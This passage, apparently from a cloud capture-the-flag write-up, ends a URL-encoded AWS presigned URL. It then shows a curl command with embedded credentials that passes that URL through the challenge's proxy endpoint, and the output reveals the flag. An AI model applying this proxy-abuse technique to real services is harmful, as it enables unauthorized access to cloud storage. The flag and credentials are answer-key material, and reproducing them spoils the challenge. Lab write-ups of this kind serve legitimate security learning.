L2xIBqjd3RIwjb37eBA58sACC7UoAmC4tvthCHmZW%252BKbPCW%252BO1IXt7gtOK0PEiZ4Kv9hiIteNYzLpf0aaPgMaz%252F4nXcWhp%252FFDXmz0dhFkKlWzXerERU7viida9E6VwLAQ%252Bif5JwLuckxOTjEut5xpY0aZkUEoxbHXtOnSrSrPra%252BO6gXz2LHj8vAzyXxRFnDHH0rPfY6DNp8ZvAMjVMJLtvMUGOrABji5lGMF5yOQIR84Sg02RyI80GTwqiHS4hR6WsitTxbrLtQ68pbl2dvLGACWtlWRM5QOp2J0qrqBhVZEcu69OcDe%252F%252BlG8eUyDgoOwfam%252BHzBHEE485P0d%252Fl9cpv5D4yXoMXZ31RYuUmXmVrMBu8Vp8HIekjZ2vlSKumjlrU1HDC%252BMOVBMMw3Fe6rEFjMGyx%252BGKK2QQNjwdFX25V0trcwSvtNnlNjUeDuiNKiW5jhNiuY%253D%26X-Amz-Signature%3D72efdcb37209a26e05fbcc97f47fb92ba77a478605f070c966287e0a41b3d5ed%0A

```

---

#### query the url to the proxy for the Flag........

```bash
user@monthly-challenge:~$ curl "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=$PRESIGNEDURL"
The flag is: WIZ_CTF_Presigned_Urls_Are_Everywhere
user@monthly-challenge:~$
```

---











